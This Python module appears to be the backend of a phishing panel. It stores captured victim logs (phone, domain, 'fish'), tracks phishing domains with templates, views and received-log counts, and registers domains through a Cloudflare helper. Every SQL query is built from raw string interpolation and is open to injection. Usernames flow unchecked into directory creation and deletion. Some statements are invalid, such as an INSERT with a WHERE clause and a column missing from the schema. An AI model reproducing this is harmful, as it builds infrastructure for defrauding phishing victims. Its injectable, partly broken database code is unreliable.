from peewee import SqliteDatabase
from datetime import datetime
from os import mkdir
from shutil import rmtree
from config import clf


class User:

    def __init__(self, database_path, table):
        self.database_path = database_path
        self.table = table

    def GetUserBy(self, parameter, value):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM {self.table} WHERE {parameter}='{value}'")
            conn.commit()
            data = cursor.fetchall()
            return data


    def UpdateUser(self, datas, parameter, value):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            for data in datas:
                cursor.execute(f"UPDATE {self.table} SET {data[0]} = '{data[1]}' WHERE {parameter} = '{value}';")
                conn.commit()
            return True


    def GetAllUsers(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM {self.table}")
            conn.commit()
            data = cursor.fetchall()
            return data


    def AddUser(self, username, password, note):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"INSERT INTO {self.table}(`username`, `created_on`, `updated_on`, `password_hash`, `note`) VALUES('{username}', '{datetime.utcnow()}', '{datetime.utcnow()}', '{password}', '{note}') ")
            conn.commit()
            mkdir(f'./users/{username}/')
            f = open(f'./users/{username}/database.db', 'w')
            f.close()

            with SqliteDatabase(f'./users/{username}/database.db') as conn:
                cursor = conn.cursor()
       
                cursor.execute("""
                CREATE TABLE logs (
                    phone  VARCHAR,
                    domain TEXT,
                    time   DATETIME,
                    fish   VARCHAR
                );
                """)

                cursor.execute("""
                CREATE TABLE "domains" (
                    "domain"	TEXT,
                    "servers"	TEXT,
                    "template"	TEXT,
                    "status"	TEXT,
                    "views"	INTEGER DEFAULT 0,
                    "logsReceived"	INTEGER DEFAULT 0,
                    "created_on"	DATETIME
                );
                """)

                conn.commit()

            return True


    def RemoveUser(self, username):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"DELETE FROM {self.table} WHERE username = '{username}'")
            conn.commit()
            rmtree(f'./users/{username}')
            return True
    

    def GetAdmins(self, username):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM admins WHERE username = '{username}'")
            conn.commit()
            data = cursor.fetchone()
            if data == None:
                data = [None, None]
            return data



class Victim:
    def __init__(self, database_path):
        self.database_path = database_path

    def GetLogs(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM logs")
            conn.commit()
            data = cursor.fetchall()
            return data
        

    def GetDomains(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM domains")
            conn.commit()
            data = cursor.fetchall()
            return data
        

    def AddDomain(self, domain, page, path, redirect, countries, username):
        added_domain = clf.AddDomain(domain)
        if added_domain:
            zones = clf.getDomains()
            for zone in zones:
                if zone == domain:
                    zone_id = zone['id']
                    status = zone['status']
                    name_servers = zone['name_servers']

                    with SqliteDatabase(self.database_path) as conn:
                        cursor = conn.cursor()
                        cursor.execute(f"INSERT INTO domains(domain, zone_id, servers, status, template, created_on) VALUES('{domain}', '{zone_id}', '{name_servers}', '{status}', '{page}', {datetime.utcnow()}) WHERE username = '{username}'")
                        conn.commit()
                        mkdir(f"users/{username}/websites/{domain}")
                        f = open(f"users/{username}/websites/{domain}/index.html", 'w')
                        f.close()
                        return True
            return False
        else:
            return False